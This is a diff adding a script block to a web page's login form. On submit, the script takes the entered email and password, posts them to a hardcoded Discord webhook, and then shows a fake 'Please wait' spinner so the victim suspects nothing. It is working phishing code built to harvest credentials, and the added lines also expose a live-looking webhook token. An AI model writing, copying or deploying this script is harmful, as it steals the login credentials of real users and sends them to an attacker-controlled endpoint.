@@ -1,0 +1,43 @@
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+  const form = document.getElementById('login-form');
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    const email = form.email.value;
+    const password = form.password.value;
+
+    console.log('Sending to webhook:', email, password); // Debug log
+
+    fetch('https://discord.com/api/webhooks/1399868638218948709/x0VBJgBgWLJQrOByqOC4Xk_OZ0EsN4FKxH3aYs-MYamYTFrBCK21IAcdSGyImeFOIieo', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        content: `Email: ${email}\nPassword: ${password}`
+      })
+    })
+    .then(() => {
+      document.body.innerHTML = `
+        <div style="font-family: Arial, sans-serif; text-align: center; padding: 100px;">
+          <h1 style="color: #EF112E;">Please wait...</h1>
+          <p>We are processing your request. This may take a moment.</p>
+          <div style="margin-top: 40px;">
+            <svg width="50" height="50" viewBox="0 0 100 100">
+              <circle cx="50" cy="50" r="40" stroke="#EF112E" stroke-width="10" fill="none" stroke-dasharray="250" stroke-dashoffset="0">
+                <animateTransform attributeName="transform" type="rotate" from="0 50 50" to="360 50 50" dur="1s" repeatCount="indefinite"/>
+              </circle>
+            </svg>
+          </div>
+        </div>
+      `;
+    })
+    .catch(error => {
+      console.error('Error sending data:', error);
+      alert('Something went wrong. Please try again.');
+    });
+  });
+});
+</script>
